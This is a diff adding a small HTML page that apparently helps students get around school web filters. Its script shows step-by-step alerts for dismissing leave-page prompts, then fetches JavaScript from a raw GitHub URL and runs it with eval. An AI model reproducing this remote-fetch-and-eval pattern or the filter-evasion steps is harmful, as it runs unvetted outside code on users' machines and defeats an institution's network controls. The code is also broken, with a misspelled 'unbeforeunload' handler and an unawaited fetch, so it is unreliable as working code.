@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      window.unbeforeunload = () => {return false;}
+      alert("DIRECTIONS: A prompt will soon show up asking what page you want to open. Type the URL of the page, including https://. Next, a prompt will show up asking you if you want to leave the page. Click no. It might show up again, but click prevent this page from making additional dialogues, and then click cancel. You can now visit the page unblocked!");
+      try {
+        eval(fetch("https://raw.githubusercontent.com/schoolexploitkid/UNBLOCK3R-New/refs/heads/main/index.js").text());
+        alert("Started");
+      } catch (e) {
+        alert(e);
+      }
+    </script>
+  </body>
+</html>
